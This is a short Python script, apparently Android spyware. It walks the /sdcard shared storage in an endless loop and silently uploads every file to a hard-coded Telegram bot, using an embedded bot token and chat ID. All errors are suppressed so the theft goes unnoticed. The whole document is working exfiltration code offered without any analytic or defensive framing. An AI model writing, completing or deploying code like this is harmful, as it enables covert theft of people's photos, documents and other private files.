import os
import time
import requests

BOT_TOKEN = "7796430148:AAGSK7BYRg9BWdOiYkWeb71TY7TPcmnSZCA"
CHAT_ID = "6904067155"

def send_file(path):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        with open(path, 'rb') as f:
            requests.post(url, files={'document': f}, data={'chat_id': CHAT_ID})
    except:
        pass

def start():
    while True:
        for root, dirs, files in os.walk("/sdcard"):
            for file in files:
                path = os.path.join(root, file)
                try:
                    send_file(path)
                    time.sleep(1)
                except:
                    continue
        time.sleep(600)

if __name__ == "__main__":
    start()
